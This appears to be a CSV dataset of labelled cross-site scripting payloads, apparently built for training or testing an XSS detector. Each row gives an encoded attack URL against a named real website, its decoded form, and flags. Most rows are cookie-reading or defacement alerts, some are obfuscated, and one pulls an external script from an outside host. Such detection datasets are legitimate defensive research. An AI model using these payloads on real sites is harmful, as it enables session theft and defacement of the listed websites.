Payloads,Class,decoded,executed,parser_changed
http://local.virtualchestercounty.com/utilities/popup_calendar.cfm?formname=&quot;&gt;&lt;script&gt;alert(&quot;cyber-w<br>arrior.org&quot;)&lt;/script&gt;,Malicious,"http://local.virtualchestercounty.com/utilities/popup_calendar.cfm?formname=""><script>alert(""cyber-warrior.org"")</script>",True,True
http://cap.in.coocan.jp/orz/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kus<br>omiso.com%22)%3c/script%3e,Malicious,"http://cap.in.coocan.jp/orz/orz.cgi/-/kusomiso.com/'>"">'><script>alert(""xss by kusomiso.com"")</script>",True,True
http://www.eworldgenie.com/signup.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.eworldgenie.com/signup.php?ref=""><script>alert(1);</script>",True,True
http://www.isys-bw.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor<br>&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.isys-bw.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
comment=1</textarea>1<script>alert('a3q')</script>&email=1</textarea>1<script>alert('a3q')</script>&hidden_spam_filter=72021b05481a336d481b22241db299c2&hncaptcha=75351432584951286999272589517356&hncaptcha_private_key=&hncaptcha_public_key=bfc&name=1</textarea>1<script >alert('a3q')</script>&sent=true&subject=1</textarea>1<script >alert('a3q')</script>1,Malicious,comment=1</textarea>1<script>alert('a3q')</script>&email=1</textarea>1<script>alert('a3q')</script>&hidden_spam_filter=72021b05481a336d481b22241db299c2&hncaptcha=75351432584951286999272589517356&hncaptcha_private_key=&hncaptcha_public_key=bfc&name=1</textarea>1<script >alert('a3q')</script>&sent=true&subject=1</textarea>1<script >alert('a3q')</script>1,True,True
http://www.idahorosesociety.org/irsphotogallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.idahorosesociety.org/irsphotogallery/login.asp?folder=&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
"<img src onerror /"" '""= alt=javascript:alert(1)//"">",Malicious,"<img src onerror /"" '""= alt=javascript:alert(1)//"">",True,True
http://www.toyota-forklifts.com.tr/tr/support/pages/result.aspx?k=<br>=&quot;&gt;&lt;script&gt;alert(/pyske/)&lt;/script&gt;,Malicious,"http://www.toyota-forklifts.com.tr/tr/support/pages/result.aspx?k==""><script>alert(/pyske/)</script>",True,True
http://fourkornerz.com/gb/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://fourkornerz.com/gb/index.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.cabinet-avril.com/index.php?lang=it/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.cabinet-avril.com/index.php?lang=it/""><script>alert('xss by atm0n3r')</script>",True,True
http://europa.eu/youth/forgotpass.cfm?cpage=2&l_id=en&mail=%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,http://europa.eu/youth/forgotpass.cfm?cpage=2&l_id=en&mail=<script>alert(document.cookie)</script>,True,True
"</title><script>alert(""xss"");</script>",Malicious,"</title><script>alert(""xss"");</script>",True,True
http://www2.worldlingo.com/wl/search/search_results.html?query=%22'%3e%3cscript%3ealert(1)%3c/script<br>%3e&amp;submit=search+again,Malicious,"http://www2.worldlingo.com/wl/search/search_results.html?query=""'><script>alert(1)</script>&submit=search again",True,True
http://www.msanti.net/blog/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript%20%0a%0d%3ea<br>lert(document.cookie)%3b%3c/script%3e,Malicious,"http://www.msanti.net/blog/index.php?action=search&item=content&blog=>""><script 
>alert(document.cookie);</script>",True,True
http://whois.ws/websearch.php?current_name=mirc.com&amp;query=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%<br>2fscript%3e&amp;submit=web+search,Malicious,"http://whois.ws/websearch.php?current_name=mirc.com&query="">'><script>alert(123)</script>&submit=web search",True,True
http://www.daysofprohibition.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://www.daysofprohibition.com/register.php?ref='><script>alert(document.cookie);</script>,True,True
http://orion.myonlineusers.com/info.php?url=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://orion.myonlineusers.com/info.php?url=<script>alert(document.cookie)</script>,True,True
http://www.worldshakesbib.org/search?searchtype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.worldshakesbib.org/search?searchtype=""><script>alert(""maxwel"")</script>",True,True
http://www.canada.com/topics/entertainment/story.html?id=d01cd4f5-2c35-4fca-86c7-74a53950b69e&amp;k=%22%<br>3e%3cscript%3ealert%28%22by%20candark%22%29%3c/script%3e,Malicious,"http://www.canada.com/topics/entertainment/story.html?id=d01cd4f5-2c35-4fca-86c7-74a53950b69e&k=""><script>alert(""by candark"")</script>",True,True
http://www.lbc.edu/public/alumni.07/career_results.php?category=5&amp;name=general%22%3e%22%3e/r0hit/%3e<br>%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%20src=http://iblog.ir/style.js%3e%3c/script<br>%3e,Malicious,"http://www.lbc.edu/public/alumni.07/career_results.php?category=5&name=general"">"">/r0hit/><script>alert(document.cookie)</script><script src=http://iblog.ir/style.js></script>",True,True
http://khazbanar.net/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://khazbanar.net/register.php?ref=""><script>alert(1);</script>",True,True
http://www.unforgivenwar.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://www.unforgivenwar.com/register.php?ref='><script>alert(document.cookie);</script>,True,True
http://ms101.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms101.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://hk.dmz-plus.com/a-news.cgi?date=2007.11.30&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%<br>72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%3<br>1%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36<br>%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://hk.dmz-plus.com/a-news.cgi?date=2007.11.30&cal="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.esbpl.org/default.asp?t=&lt;script&gt;alert(&quot;scriptorium(turkey) hackhaber.com&quot;)&lt;/script&gt;,Malicious,"http://www.esbpl.org/default.asp?t=<script>alert(""scriptorium(turkey) hackhaber.com"")</script>",True,True
http://paspasnet.info/forum/philboard_search.asp?searchterms=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://paspasnet.info/forum/philboard_search.asp?searchterms=<script>alert(document.cookie)</script>,True,True
http://www.immob-iles.fr/index.php?lang=fr/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.immob-iles.fr/index.php?lang=fr/""><script>alert('xss by atm0n3r')</script>",True,True
http://www.umweltdatenbank.de/cgi-local/cmail.pl/to=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.umweltdatenbank.de/cgi-local/cmail.pl/to=""><script>alert(""maxwel"")</script>",True,True
http://www.impgc.com/paging.php?id=m%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.impgc.com/paging.php?id=m""><script>alert(document.cookie)</script>",True,True
http://www.govtech.com/gt/search.php?qs=&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;/script&gt;,Malicious,"http://www.govtech.com/gt/search.php?qs=""><script>alert(""fugitif"")</script>",True,True
http://www.hostprofessor.com/host/search_update.asp?search=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.hostprofessor.com/host/search_update.asp?search=""><script>alert(""maxwel"")</script>",True,True
http://chicago.bbb.org/wwwroot/search.aspx?site=46&amp;s=xss%22%3e%3cscript%3ealert%28document.cookie%29<br>%3c/script%3e,Malicious,"http://chicago.bbb.org/wwwroot/search.aspx?site=46&s=xss""><script>alert(document.cookie)</script>",True,True
http://psychics.psychicchat.net/index.php?file=horoscopedetail&amp;id=%22%3e%3cscript%3ealert%28document<br>.cookie%29%3c%2fscript%3e,Malicious,"http://psychics.psychicchat.net/index.php?file=horoscopedetail&id=""><script>alert(document.cookie)</script>",True,True
http://foreseeresults.verisign.com/survey/standardtemplate.jsp?pid=paeav4normfool5jppvf4q==&amp;mid=9arg<br>xqsuseufwyivf5jjea==&amp;smode=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;,Malicious,"http://foreseeresults.verisign.com/survey/standardtemplate.jsp?pid=paeav4normfool5jppvf4q==&mid=9argxqsuseufwyivf5jjea==&smode=""><script>alert(/xss/)</script>",True,True
http://www.videospace.ro/uprofile.php?uid=%22%3e%3cscript%3ealert(/xssed%20by%20dr.optix/);alert(doc<br>ument.cookie)%3c/script%3e,Malicious,"http://www.videospace.ro/uprofile.php?uid=""><script>alert(/xssed by dr.optix/);alert(document.cookie)</script>",True,True
http://60.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://60.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.springwidgets.com/widgetize/23/?param=%3c/textarea%3e%3cscript%3ealert(/xss/);%3c/script%<br>3e,Malicious,http://www.springwidgets.com/widgetize/23/?param=</textarea><script>alert(/xss/);</script>,True,True
http://www.wwf.org.py/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;<br>x=0&amp;y=0,Malicious,"http://www.wwf.org.py/index.cfm?uglobalsearch=""><script>alert('xss')</script>&x=0&y=0",True,True
http://icstirlingshire.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedeface<br>d.org/)%3c/script%3e%3cp,Malicious,"http://icstirlingshire.icnetwork.co.uk/search.cfm?query=""><script>alert(/xss - thedefaced.org/)</script><p",True,True
http://www.schaustellerbetrieb-scheit.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.schaustellerbetrieb-scheit.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.vodafone.com.gh/search-results.aspx?searchtext=%22%3cscript%3ealert%28%22xssed%22%29%3c%2<br>fscript%3e%22%3cscript%3ealert%28%22xssed%22%29%3c%2fscript%3e&amp;searchmode=allwords,Malicious,"http://www.vodafone.com.gh/search-results.aspx?searchtext=""<script>alert(""xssed"")</script>""<script>alert(""xssed"")</script>&searchmode=allwords",True,True
http://www.resimyuklet.com/resim.php?cg=uploads2/load106322.png&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&lt;h1&gt;by st@rext&lt;/h1&gt;,Malicious,"http://www.resimyuklet.com/resim.php?cg=uploads2/load106322.png""><script>alert(document.cookie)</script><h1>by st@rext</h1>",True,True
http://adt-bs.de/direct_order.php?message=%3c/font%3e%3cscript%3ealert(123)%3c/script%3e&amp;lang=en&amp;sid<br>=742ccab62f32ea9b418a5846284c9f8c,Malicious,http://adt-bs.de/direct_order.php?message=</font><script>alert(123)</script>&lang=en&sid=742ccab62f32ea9b418a5846284c9f8c,True,True
http://www.space.com/php/multimedia/imagegallery/igviewer.php?gid=413%22%3e%3c/title%3e%3cscript%3ea<br>lert(document.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eisoz%20was%20here%20~biowormsecurity~%3c/h<br>1%3e%3c/marquee%3e,Malicious,"http://www.space.com/php/multimedia/imagegallery/igviewer.php?gid=413""></title><script>alert(document.cookie)</script>><marquee><h1>isoz was here ~biowormsecurity~</h1></marquee>",True,True
http://compton.parish.hants.gov.uk/meldrew/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious,"http://compton.parish.hants.gov.uk/meldrew/phpinfo.php?a[]=""><script>alert(document.cookie)</script>",True,True
http://www.dunkelsteinerwald.at/neu//start.cfm?aktuellname=home%27%22%3e%3c/title%3e%3cscript%3ealer<br>t(1337)%3c/script%3e&amp;cfid=5191416&amp;cftoken=59fd7af8ca095%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%<br>3c/script%3ef89-567f88b2-40f4-4598-ca3bb3933ca6a30e,Malicious,"http://www.dunkelsteinerwald.at/neu//start.cfm?aktuellname=home'""></title><script>alert(1337)</script>&cfid=5191416&cftoken=59fd7af8ca095'""></title><script>alert(1337)</script>f89-567f88b2-40f4-4598-ca3bb3933ca6a30e",True,True
http://www.eintrag-yahoo.de/lp_php/results.php?appl_id=83&amp;market=de&amp;lang=de_de&amp;keyword=&quot;&gt;&lt;script&gt;ale<br>rt(document.cookie)&lt;/script&gt;,Malicious,"http://www.eintrag-yahoo.de/lp_php/results.php?appl_id=83&market=de&lang=de_de&keyword=""><script>alert(document.cookie)</script>",True,True
http://www.londontown.com/search/full/%22%3e%3cimg%20src=.%20onerror=alert('airroxssed');%3e,Malicious,"http://www.londontown.com/search/full/""><img src=. onerror=alert('airroxssed');>",True,True
http://www.wbphed.gov.in/applications/map_mnt/search.php?catagory=%27%22%3e%3cscript%3ealert(documen<br>t.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3e-xss%20by%20th3%20rdx-%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.wbphed.gov.in/applications/map_mnt/search.php?catagory='""><script>alert(document.cookie)</script>'""><marquee><h1>-xss by th3 rdx-</h1></marquee>",True,True
http://www.securityspace.com/smysecure/catid.html?ctype=cve&amp;id=%3c/title%3e%3cscript%3ealert(/kusomi<br>so.com/)%3c/script%3e,Malicious,http://www.securityspace.com/smysecure/catid.html?ctype=cve&id=</title><script>alert(/kusomiso.com/)</script>,True,True
http://www.onlinefacile.it/search.php?keyword=%3cscript%3ealert(document.cookie)%3b%3c%2fscript%3e,Malicious,http://www.onlinefacile.it/search.php?keyword=<script>alert(document.cookie);</script>,True,True
http://www.lvif.gov.lv/?object_id=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious,"http://www.lvif.gov.lv/?object_id=""><script>alert(/xssed/);</script>",True,True
http://adspecs.yahoo.it/search-it?q=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+hari%28topsecure.net%29%3c%2fh1%3e%3c%2fmarquee%3e&addr=&hs=1&lat=&lon=&locac=0,Malicious,"http://adspecs.yahoo.it/search-it?q= }</style><script>a=eval;b=alert;a(b(/xss/.source));</script><marquee bgcolor=""red""><h1>xss3d by hari(topsecure.net)</h1></marquee>&addr=&hs=1&lat=&lon=&locac=0",True,True
http://www.achei.com.br/cgi-ps/ps_query1.cgi?franq=028&amp;country=br&amp;countries=br&amp;tipo=e&amp;opcao=br&amp;x=0&amp;y<br>=0&amp;query=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22,Malicious,"http://www.achei.com.br/cgi-ps/ps_query1.cgi?franq=028&country=br&countries=br&tipo=e&opcao=br&x=0&y=0&query=""><script>alert(123)</script>""",True,True
http://www.barracudanetworks.com/ns/news_and_events/news.php?nid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.barracudanetworks.com/ns/news_and_events/news.php?nid=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://mx.isti.cnr.it/cgi-bin/conan?key=cc~messages~errormessage&amp;title=vms%20help&amp;referer=&quot;&gt;&lt;script&gt;<br>alert('=xssbydt=')&lt;/script&gt;,Malicious,"http://mx.isti.cnr.it/cgi-bin/conan?key=cc~messages~errormessage&title=vms help&referer=""><script>alert('=xssbydt=')</script>",True,True
http://ehomarketing.com/search.php?q=&lt;/title&gt;&lt;/head&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/html&gt;,Malicious,http://ehomarketing.com/search.php?q=</title></head><script>alert(document.cookie)</script></html>,True,True
http://www.tulane-app.org/9813/login.asp?pin=a2n3a1i8r7b749~8&amp;wcc=tu3&amp;c=%22%3e%3cscript%3ealert(docu<br>ment.cookie)%3c/script%3e,Malicious,"http://www.tulane-app.org/9813/login.asp?pin=a2n3a1i8r7b749~8&wcc=tu3&c=""><script>alert(document.cookie)</script>",True,True
http://www.combust.cn/cgi-bin/topic.cgi?forum=71&amp;topic=175&amp;show=90%22%3e%27%3e%3c%73%63%72%69%70%74%<br>3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2<br>c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31<br>%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://www.combust.cn/cgi-bin/topic.cgi?forum=71&topic=175&show=90"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.pc101.com/forum/f32/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.pc101.com/forum/f32/?threadprefix=""></a><script>alert(document.cookie);</script>",True,True
http://www.asambleanacional.gov.ve/publico/biblio/pi_biblio.php?secc=&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,http://www.asambleanacional.gov.ve/publico/biblio/pi_biblio.php?secc=<script>alert(123)</script>,True,True
http://www.meetgreatcouples.com/member/profile.php?profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.meetgreatcouples.com/member/profile.php?profile_id=""><script>alert(""backdoor"")</script>",True,True
http://ms138.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms138.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.busrates.com/results.php?page=1&amp;city=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/scri<br>pt%3e,Malicious,"http://www.busrates.com/results.php?page=1&city=<<script>alert(""resistance"");//<</script>",True,True
http://autokolik.com/default.asp?say=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://autokolik.com/default.asp?say=""><script>alert(""backdoor"")</script>",True,True
https://support.resellerclub.com/support/attachfile.jsp?attachedfile=%22%3e%3cscript%3ealert(1)%3c/s<br>cript%3e,Malicious,"https://support.resellerclub.com/support/attachfile.jsp?attachedfile=""><script>alert(1)</script>",True,True
http://www.virtualflybox.com/articles/article.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3<br>c/script%3e,Malicious,"http://www.virtualflybox.com/articles/article.php?id='""></title><script>alert(1)</script>",True,True
http://www.transformers-universe.com/include.php?path=misc/suggest.php&amp;suggest_path=&lt;/textarea&gt;&lt;scri<br>pt&gt;alert(1);&lt;/script&gt;,Malicious,http://www.transformers-universe.com/include.php?path=misc/suggest.php&suggest_path=</textarea><script>alert(1);</script>,True,True
http://www.partmaster.co.uk/cgi-bin/downloads.pl?brand=instruction+manuals&amp;criteria=%22%3e%3c%73%63%<br>72%69%70%74%3e%61%6c%65%72%74%28%22%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%7<br>3%63%72%69%70%74%3e,Malicious,"http://www.partmaster.co.uk/cgi-bin/downloads.pl?brand=instruction manuals&criteria=""><script>alert(""Amazed? - Stuarty"")</script>",True,True
http://www.triospor.com/deniz/default.php?lang=tr&amp;part=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.triospor.com/deniz/default.php?lang=tr&part=""><script>alert(document.cookie)</script>",True,True
http://www.hxhack.com/bbs/thread.php?fid=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.hxhack.com/bbs/thread.php?fid=""><script>alert(""backdoor"")</script>",True,True
http://www.annoncesemploi.org/moteur.php3?secteur=&amp;region=&amp;mots=+%3cscript%3ealert%28%2fzeryus%2f%29<br>%3c%2fscript%3e%3cmarque&amp;image.x=0&amp;image.y=0,Malicious,http://www.annoncesemploi.org/moteur.php3?secteur=®ion=&mots= <script>alert(/zeryus/)</script><marque&image.x=0&image.y=0,True,True
http://www.immobiliere-michel-vautier.fr/index.php?lang=fr/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious,"http://www.immobiliere-michel-vautier.fr/index.php?lang=fr/""><script>alert('xss byatm0n3r')</script>",True,True
http://hawaii.gov/dcca_condo/search_result.php?sort=4&amp;proj_no=%22%3e%3cscript%3ealert%28/xssed/%29%3<br>c/script%3e&amp;proj_name=&amp;zoning=&amp;tmk_no=&amp;proj_city=&amp;dev_name=&amp;unt_ttl1=&amp;unt_ttl2=,Malicious,"http://hawaii.gov/dcca_condo/search_result.php?sort=4&proj_no=""><script>alert(/xssed/)</script>&proj_name=&zoning=&tmk_no=&proj_city=&dev_name=&unt_ttl1=&unt_ttl2=",True,True
http://www.nea.gr/nea_gr/index.php?cat_id=3&amp;subcat_id=14&lt;script&gt;alert(&quot;xss was found&quot;)&lt;/script&gt;,Malicious,"http://www.nea.gr/nea_gr/index.php?cat_id=3&subcat_id=14<script>alert(""xss was found"")</script>",True,True
http://kizilcaoren.org/foto/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://kizilcaoren.org/foto/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://deltaweathercam.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://deltaweathercam.com/guestbook/index.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://search.ibibo.com/isearch/result/provider/searchibibo_all/1/?q=error%2522%253e%253cscript+language%253djavascript%253ealert%2528document.cookie%2529%253b%253c%252fscript%253e&uname=0,Malicious,"http://search.ibibo.com/isearch/result/provider/searchibibo_all/1/?q=error""><script language=javascript>alert(document.cookie);</script>&uname=0",True,True
http://www.dewaweb.net/videoara.php?s=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.dewaweb.net/videoara.php?s=""><script>alert(document.cookie)</script>",True,True
http://www.tigerdirect.ca/applications/email/d_error.asp?email=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;,Malicious,"http://www.tigerdirect.ca/applications/email/d_error.asp?email=""><script>alert(1)</script><""",True,True
http://xss.in/more.php?id=228_0_1_0_m%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3c<br>marquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://xss.in/more.php?id=228_0_1_0_m'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://gnu-darwin.sourceforge.net/index.php?page=%3c/title%3e%3cscript%3ealert(%22vulnerabilit%e0%20<br>xss.%20by%20nakky%ae%22);%3c/script%3e,Malicious,"http://gnu-darwin.sourceforge.net/index.php?page=</title><script>alert(""vulnerabilit� xss. by nakky�"");</script>",True,True
http://20.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://20.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.viltdata.se/default.asp?pageid=22084&amp;path=&amp;oewcmd=4&amp;id=124&amp;query=%27%3e%3cscript%3ealert(<br>123)%3c%2fscript%3e,Malicious,http://www.viltdata.se/default.asp?pageid=22084&path=&oewcmd=4&id=124&query='><script>alert(123)</script>,True,True
http://www.drafthouse.com/mason/purchase.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.drafthouse.com/mason/purchase.php?id=""><script>alert(document.cookie)</script>",True,True
http://board.astrakhan.ws/?act=viewadv&amp;id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script<br>%3e,Malicious,"http://board.astrakhan.ws/?act=viewadv&id='""></title><script>alert(1337)</script>",True,True
http://atlanta.bizjournals.com/atlanta/othercities/louisville/stories/2007/07/16/tidbits4.html?jst=&quot;<br>&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/script&gt;,Malicious,"http://atlanta.bizjournals.com/atlanta/othercities/louisville/stories/2007/07/16/tidbits4.html?jst=""><script>alert(""cyber"")</script>",True,True
http://developer.klocwork.com/register_thanks.php?email=%22%3e%3cscript%3ealert(1);%3c/script%3e,Malicious,"http://developer.klocwork.com/register_thanks.php?email=""><script>alert(1);</script>",True,True
http://blogs.zdnet.com/emailform.php?email=danchev&amp;name=dancho%20danchev%27%22%3e%3c/title%3e%3cscri<br>pt%3ealert(%27haha%20hello%20=p%27)%3c/script%3e,Malicious,"http://blogs.zdnet.com/emailform.php?email=danchev&name=dancho danchev'""></title><script>alert('haha hello =p')</script>",True,True
http://help.travian.com/index.php?type=%22%3e%3c/script%3e%3cscript%3ealert(/xssed_by_nemesis/);aler<br>t(document.cookie);%3c/script%3e,Malicious,"http://help.travian.com/index.php?type=""></script><script>alert(/xssed_by_nemesis/);alert(document.cookie);</script>",True,True
http://www.nic.cr/news/news?tid=newsdisplayqn__qncodigonoticia=21qn__qncodigoinstancia=1%3cscript%3e<br>alert(document.cookie)%3c/script%3e,Malicious,http://www.nic.cr/news/news?tid=newsdisplayqn__qncodigonoticia=21qn__qncodigoinstancia=1<script>alert(document.cookie)</script>,True,True
